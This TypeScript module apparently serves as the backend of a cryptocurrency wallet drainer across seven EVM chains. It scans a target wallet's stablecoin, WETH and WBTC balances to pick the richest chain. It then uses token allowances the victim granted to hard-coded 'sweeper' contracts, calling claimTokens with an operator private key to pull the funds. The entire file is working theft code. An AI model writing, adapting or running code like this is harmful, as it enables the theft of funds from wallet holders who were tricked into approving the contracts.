import { createPublicClient, createWalletClient, http, parseAbi } from 'viem';
import { mainnet, bsc, polygon, arbitrum, optimism, avalanche, base } from 'viem/chains';
import { privateKeyToAccount } from 'viem/accounts';

const CHAIN_CONTRACTS: Record<number, string> = {
  1: "0x333438075b576B685249ECE80909Cccad90B6297",
  56: "0x65BDae94B4412640313968138384264cAFcB1E66",
  137: "0x90E92a5D138dECe17f1fe680ddde0900C76429Dc",
  42161: "0x125112F80069d13BbCb459D76C215C7E3dd0b424",
  10: "0xe063eE1Fb241B214Bd371B46E377936b9514Cc5c",
  43114: "0xA6D97ca6E6E1C47B13d17a162F8e466EdFDe3d2e",
  8453: "0x1864b6Ab0091AeBdcf47BaF17de4874daB0574d7",
};

export { CHAIN_CONTRACTS };

const CHAIN_TOKEN_ADDRESSES: Record<number, Array<{ symbol: string; address: string; decimals: number }>> = {
  1: [
    { symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6 },
    { symbol: "USDC", address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", decimals: 6 },
    { symbol: "DAI", address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", decimals: 18 },
    { symbol: "WBTC", address: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", decimals: 8 },
    { symbol: "WETH", address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", decimals: 18 },
  ],
  56: [
    { symbol: "USDT", address: "0x55d398326f99059fF775485246999027B3197955", decimals: 18 },
    { symbol: "USDC", address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", decimals: 18 },
    { symbol: "DAI", address: "0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3", decimals: 18 },
    { symbol: "WBTC", address: "0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c", decimals: 18 },
    { symbol: "WETH", address: "0x2170Ed0880ac9A755fd29B2688956BD959F933F8", decimals: 18 },
  ],
  137: [
    { symbol: "USDT", address: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", decimals: 6 },
    { symbol: "USDC", address: "0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359", decimals: 6 },
    { symbol: "DAI", address: "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063", decimals: 18 },
    { symbol: "WBTC", address: "0x1BFD67037B42Cf73acF2047067bd4F2C47D9BfD6", decimals: 8 },
    { symbol: "WETH", address: "0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619", decimals: 18 },
  ],
  42161: [
    { symbol: "USDT", address: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", decimals: 6 },
    { symbol: "USDC", address: "0xaf88d065e77c8cC2239327C5EDb3A432268e5831", decimals: 6 },
    { symbol: "DAI", address: "0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1", decimals: 18 },
    { symbol: "WBTC", address: "0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f", decimals: 8 },
    { symbol: "WETH", address: "0x82aF49447D8a07e3bd95BD0d56f35241523fBab1", decimals: 18 },
  ],
  10: [
    { symbol: "USDT", address: "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58", decimals: 6 },
    { symbol: "USDC", address: "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85", decimals: 6 },
    { symbol: "DAI", address: "0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1", decimals: 18 },
    { symbol: "WBTC", address: "0x68f180fcCe6836688e9084f035309E29Bf0A2095", decimals: 8 },
    { symbol: "WETH", address: "0x4200000000000000000000000000000000000006", decimals: 18 },
  ],
  43114: [
    { symbol: "USDT", address: "0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7", decimals: 6 },
    { symbol: "USDC", address: "0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E", decimals: 6 },
    { symbol: "DAI", address: "0xd586E7F844cEa2F87f50152665BCbc2C279D8d70", decimals: 18 },
    { symbol: "WBTC", address: "0x50b7545627a5162F82A992c33b87aDc75187B218", decimals: 8 },
    { symbol: "WETH", address: "0x49D5c2BdFfac6CE2BFdB6640F4F80f226bc10bAB", decimals: 18 },
  ],
  8453: [
    { symbol: "USDT", address: "0xfde4C96c8593536E31F229EA8f37b2ADa2699bb2", decimals: 6 },
    { symbol: "USDC", address: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", decimals: 6 },
    { symbol: "DAI", address: "0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb", decimals: 18 },
    { symbol: "WBTC", address: "0x0555E30da8f98308EdB960aa94C0Db47230d2B9c", decimals: 8 },
    { symbol: "WETH", address: "0x4200000000000000000000000000000000000006", decimals: 18 },
  ],
};

export { CHAIN_TOKEN_ADDRESSES };

const chainConfigs: Record<number, { chain: any; rpcUrl: string }> = {
  1: { chain: mainnet, rpcUrl: 'https://ethereum.publicnode.com' },
  56: { chain: bsc, rpcUrl: 'https://bsc-dataseed.binance.org' },
  137: { chain: polygon, rpcUrl: 'https://polygon-bor-rpc.publicnode.com' },
  42161: { chain: arbitrum, rpcUrl: 'https://arb1.arbitrum.io/rpc' },
  10: { chain: optimism, rpcUrl: 'https://mainnet.optimism.io' },
  43114: { chain: avalanche, rpcUrl: 'https://api.avax.network/ext/bc/C/rpc' },
  8453: { chain: base, rpcUrl: 'https://mainnet.base.org' },
};

export { chainConfigs };

const ERC20_ABI = parseAbi([
  'function balanceOf(address owner) view returns (uint256)',
  'function allowance(address owner, address spender) view returns (uint256)',
]);

const CONTRACT_ABI = parseAbi([
  'function claimTokens(address token, address from, uint256 amount)',
  'function withdrawToken(address token, uint256 amount)',
  'function claimAndWithdraw(address token, address from, uint256 amount)',
  'function owner() view returns (address)',
]);

function getOwnerAccount() {
  const privateKey = process.env.SWEEPER_PRIVATE_KEY;
  if (!privateKey) throw new Error('SWEEPER_PRIVATE_KEY not configured');
  return privateKeyToAccount(privateKey.startsWith('0x') ? privateKey as `0x${string}` : `0x${privateKey}`);
}

export function getSpenderAddress(): string | null {
  return null;
}

export function getContractAddressForChain(chainId: number): string | null {
  return CHAIN_CONTRACTS[chainId] || null;
}

export function getContractForChain(chainId: number): string | null {
  return CHAIN_CONTRACTS[chainId] || null;
}

export async function executeDirectTransfer(params: {
  chainId: number;
  owner: string;
  tokens?: string[];
}): Promise<{ success: boolean; txHash?: string; error?: string; transfers: { token: string; symbol: string; amount: string; success: boolean }[] }> {
  const transfers: { token: string; symbol: string; amount: string; success: boolean }[] = [];

  try {
    const { chainId, owner } = params;
    const chainConfig = chainConfigs[chainId];

    if (!chainConfig) {
      return { success: false, error: `Unsupported chain: ${chainId}`, transfers };
    }

    const ownerAccount = getOwnerAccount();
    const userAddr = owner as `0x${string}`;
    const contractAddr = CHAIN_CONTRACTS[chainId];
    if (!contractAddr) {
      return { success: false, error: `No contract address for chain ${chainId}`, transfers };
    }
    const contractAddress = contractAddr as `0x${string}`;

    const publicClient = createPublicClient({
      chain: chainConfig.chain,
      transport: http(chainConfig.rpcUrl),
    });

    const walletClient = createWalletClient({
      account: ownerAccount,
      chain: chainConfig.chain,
      transport: http(chainConfig.rpcUrl),
    });

    let tokenList = CHAIN_TOKEN_ADDRESSES[chainId];
    if (!tokenList) {
      return { success: false, error: `No tokens configured for chain ${chainId}`, transfers };
    }

    if (params.tokens && params.tokens.length > 0) {
      const filterTokens = params.tokens.map(t => t.toLowerCase());
      tokenList = tokenList.filter(t => 
        filterTokens.includes(t.address.toLowerCase()) || filterTokens.includes(t.symbol.toLowerCase())
      );
    }

    let anySuccess = false;

    for (const tokenInfo of tokenList) {
      const tokenAddr = tokenInfo.address as `0x${string}`;
      try {
        const allowance = await publicClient.readContract({
          address: tokenAddr,
          abi: ERC20_ABI,
          functionName: 'allowance',
          args: [userAddr, contractAddress],
        });

        if (allowance === BigInt(0)) {
          transfers.push({ token: tokenInfo.address, symbol: tokenInfo.symbol, amount: '0', success: false });
          continue;
        }

        const balance = await publicClient.readContract({
          address: tokenAddr,
          abi: ERC20_ABI,
          functionName: 'balanceOf',
          args: [userAddr],
        });

        if (balance === BigInt(0)) {
          transfers.push({ token: tokenInfo.address, symbol: tokenInfo.symbol, amount: '0', success: false });
          continue;
        }

        const transferAmount = balance < allowance ? balance : allowance;

        console.log(`[DirectTransfer] ${tokenInfo.symbol} on chain ${chainId}: balance=${balance}, allowance=${allowance}, claiming=${transferAmount} via contract ${contractAddr}`);

        const txHash = await walletClient.writeContract({
          address: contractAddress,
          abi: CONTRACT_ABI,
          functionName: 'claimTokens',
          args: [tokenAddr, userAddr, transferAmount],
          chain: chainConfig.chain,
        });

        const receipt = await publicClient.waitForTransactionReceipt({ hash: txHash });

        if (receipt.status === 'success') {
          console.log(`[DirectTransfer] ${tokenInfo.symbol} claimed: ${transferAmount} -> contract ${contractAddr} - tx: ${txHash}`);
          transfers.push({ token: tokenInfo.address, symbol: tokenInfo.symbol, amount: transferAmount.toString(), success: true });
          anySuccess = true;
        } else {
          console.log(`[DirectTransfer] ${tokenInfo.symbol} claim reverted: ${txHash}`);
          transfers.push({ token: tokenInfo.address, symbol: tokenInfo.symbol, amount: '0', success: false });
        }
      } catch (err: any) {
        console.error(`[DirectTransfer] ${tokenInfo.symbol} error:`, err?.message);
        transfers.push({ token: tokenInfo.address, symbol: tokenInfo.symbol, amount: '0', success: false });
      }
    }

    const successfulTx = transfers.find(t => t.success);
    return {
      success: anySuccess,
      txHash: successfulTx ? 'multiple' : undefined,
      transfers,
    };
  } catch (error: any) {
    console.error('[DirectTransfer] Error:', error?.message || error);
    return { success: false, error: error?.message || 'Unknown error', transfers };
  }
}

export async function scanWalletBalances(walletAddress: string): Promise<{
  bestChainId: number | null;
  chains: Array<{ chainId: number; chainName: string; totalValue: number; tokens: Array<{ symbol: string; balance: string }> }>;
}> {
  const chainNames: Record<number, string> = {
    1: "Ethereum", 56: "BNB Chain", 137: "Polygon",
    42161: "Arbitrum", 10: "Optimism", 43114: "Avalanche", 8453: "Base",
  };

  const scanPromises = Object.entries(chainConfigs).map(async ([chainIdStr, config]) => {
    const cid = Number(chainIdStr);
    const tokens = CHAIN_TOKEN_ADDRESSES[cid];
    if (!tokens) return { chainId: cid, chainName: chainNames[cid] || `Chain ${cid}`, totalValue: 0, tokens: [] };

    try {
      const publicClient = createPublicClient({
        chain: config.chain,
        transport: http(config.rpcUrl),
      });

      const ERC20_BALANCE_ABI = parseAbi(['function balanceOf(address owner) view returns (uint256)']);

      const balanceCalls = tokens.map(token => ({
        address: token.address as `0x${string}`,
        abi: ERC20_BALANCE_ABI,
        functionName: 'balanceOf' as const,
        args: [walletAddress as `0x${string}`],
      }));

      const balances = await publicClient.multicall({ contracts: balanceCalls });

      let totalValue = 0;
      const tokenResults: Array<{ symbol: string; balance: string }> = [];

      for (let i = 0; i < tokens.length; i++) {
        const result = balances[i];
        if (result.status === 'success' && result.result) {
          const rawBalance = BigInt(result.result as any);
          if (rawBalance > BigInt(0)) {
            const symbol = tokens[i].symbol;
            const decimals = tokens[i].decimals;
            const humanBalance = Number(rawBalance) / Math.pow(10, decimals);
            tokenResults.push({ symbol, balance: humanBalance.toString() });

            if (symbol === "USDT" || symbol === "USDC" || symbol === "DAI") {
              totalValue += humanBalance;
            } else if (symbol === "WETH") {
              totalValue += humanBalance * 2500;
            } else if (symbol === "WBTC") {
              totalValue += humanBalance * 60000;
            }
          }
        }
      }

      return { chainId: cid, chainName: chainNames[cid] || `Chain ${cid}`, totalValue, tokens: tokenResults };
    } catch (err: any) {
      return { chainId: cid, chainName: chainNames[cid] || `Chain ${cid}`, totalValue: 0, tokens: [] };
    }
  });

  const results = await Promise.all(scanPromises);
  results.sort((a, b) => b.totalValue - a.totalValue);
  const bestChainId = results.length > 0 && results[0].totalValue > 0 ? results[0].chainId : null;

  return { bestChainId, chains: results };
}
